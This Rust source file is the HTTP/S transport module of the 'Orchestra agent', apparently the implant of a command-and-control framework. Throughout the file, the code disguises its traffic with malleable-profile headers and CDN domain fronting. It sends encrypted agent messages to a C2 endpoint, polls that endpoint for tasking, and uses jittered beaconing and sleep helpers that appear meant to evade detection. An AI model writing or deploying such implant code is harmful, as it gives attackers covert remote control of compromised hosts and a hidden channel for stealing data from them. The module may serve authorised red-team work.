//! HTTP/S malleable-profile transport for the Orchestra agent.
//!
//! # Status: EXPERIMENTAL — not wired into the default startup path
//!
//! This module implements a `Transport` that tunnels agent messages over
//! HTTP/S using a malleable C2 profile (custom User-Agent, Host header,
//! URI staging, etc.).
//!
//! ## How to enable
//!
//! 1. Set `malleable_profile` in `agent.toml`.
//! 2. In `agent/src/lib.rs` `Agent::new()`, replace the default TLS transport
//!    with `c2_http::HttpTransport::new(&profile, session).await?`.
//!
//! The server side must expose the staging URI via its reverse proxy; see
//! `docs/C_SERVER.md` for configuration details.
//!
//! ## Security warning
//!
//! This transport does **not** enforce certificate pinning by itself; pinning
//! is handled by the underlying `reqwest` client when `danger_accept_invalid_certs`
//! is `false` and a `server_cert_fingerprint` is configured.

use anyhow::{anyhow, Result};
use async_trait::async_trait;
use common::config::MalleableProfile;
use common::{CryptoSession, Message, Transport};
use tokio::time::Duration;

pub struct HttpTransport {
    profile: MalleableProfile,
    client: reqwest::Client,
    session: CryptoSession,
}

impl HttpTransport {
    pub async fn new(profile: &MalleableProfile, session: CryptoSession) -> Result<Self> {
        // Enforce kill date check if implemented in profile (assuming kill_date is String/u64)
        // if let Some(kd) = profile.kill_date { check... }

        // Malleable profile headers
        let mut headers = reqwest::header::HeaderMap::new();
        headers.insert(
            reqwest::header::USER_AGENT,
            reqwest::header::HeaderValue::from_str(&profile.user_agent)?,
        );
        if !profile.host_header.is_empty() {
            headers.insert(
                reqwest::header::HOST,
                reqwest::header::HeaderValue::from_str(&profile.host_header)?,
            );
        }

        // Build HTTP client with rustls and custom headers
        let client = reqwest::Client::builder()
            .use_rustls_tls()
            .default_headers(headers)
            .build()?;

        Ok(Self {
            profile: profile.clone(),
            client,
            session,
        })
    }

    async fn connect_with_retry(
        &self,
        req_builder: reqwest::RequestBuilder,
    ) -> Result<reqwest::Response> {
        let mut delay = 1;
        let mut attempt = 0u32;
        const MAX_ATTEMPTS: u32 = 8;
        loop {
            attempt += 1;
            if attempt > MAX_ATTEMPTS {
                anyhow::bail!("C2 unreachable after {} attempts; giving up", MAX_ATTEMPTS);
            }
            // Apply jitter to backoff
            let jitter = rand::random::<f64>() * 0.2 + 0.9;
            let current_delay = (delay as f64 * jitter) as u64;

            // Clone builder since we might retry
            match req_builder
                .try_clone()
                .ok_or_else(|| anyhow!("Failed to clone request"))?
                .send()
                .await
            {
                Ok(resp) => return Ok(resp),
                Err(e) => {
                    log::warn!(
                        "HTTP connection failed: {}. Retrying in {}s...",
                        e,
                        current_delay
                    );
                    crate::memory_guard::guarded_sleep(Duration::from_secs(current_delay), None)
                        .await?;
                    delay *= 2;
                    if delay > 64 {
                        delay = 64;
                    }
                }
            }
        }
    }
}

#[async_trait]
impl Transport for HttpTransport {
    async fn send(&mut self, msg: Message) -> Result<()> {
        log::debug!(
            "Malleable HTTP C2 Send with profile User-Agent: {}",
            self.profile.user_agent
        );

        let endpoint = if self.profile.cdn_relay {
            // Domain-fronting: connect to CDN IP/host, Host header points to C2.
            format!("https://{}", self.profile.host_header)
        } else {
            // Direct C2: operator must configure direct_c2_endpoint.
            if self.profile.direct_c2_endpoint.is_empty() {
                anyhow::bail!("direct_c2_endpoint is not configured; set it in the malleable profile for non-CDN deployments");
            }
            self.profile.direct_c2_endpoint.clone()
        };

        // Serialize and encrypt payload
        let serialized = bincode::serialize(&msg)?;
        let ciphertext = self.session.encrypt(&serialized);

        // POST request
        let req = self
            .client
            .post(format!("{}{}", endpoint, self.profile.uri))
            .body(ciphertext);
        let resp = self.connect_with_retry(req).await?;
        if !resp.status().is_success() {
            anyhow::bail!("C2 POST returned HTTP {}", resp.status());
        }

        Ok(())
    }

    async fn recv(&mut self) -> Result<Message> {
        log::debug!("Malleable HTTP C2 Recv polling via GET");

        let endpoint = if self.profile.cdn_relay {
            format!("https://{}", self.profile.host_header)
        } else {
            if self.profile.direct_c2_endpoint.is_empty() {
                anyhow::bail!("direct_c2_endpoint is not configured; set it in the malleable profile for non-CDN deployments");
            }
            self.profile.direct_c2_endpoint.clone()
        };

        let req = self.client.get(format!("{}{}", endpoint, self.profile.uri));
        let resp = self.connect_with_retry(req).await?;
        let bytes = resp.bytes().await?;

        if bytes.is_empty() {
            // No tasking: sleep with jitter then signal the caller with a Heartbeat
            // so the main loop continues rather than treating this as a transport error.
            let sleep_dur = crate::obfuscated_sleep::calculate_jittered_sleep(
                &common::config::SleepConfig::default(),
            );
            crate::memory_guard::guarded_sleep(sleep_dur, None).await?;
            return Ok(Message::Heartbeat {
                timestamp: std::time::SystemTime::now()
                    .duration_since(std::time::UNIX_EPOCH)
                    .unwrap_or_default()
                    .as_secs(),
                agent_id: String::new(),
                status: "idle".to_string(),
            });
        }

        // Decrypt and deserialize
        let plaintext = self.session.decrypt(&bytes)?;
        let msg = bincode::deserialize(&plaintext)?;
        Ok(msg)
    }
}
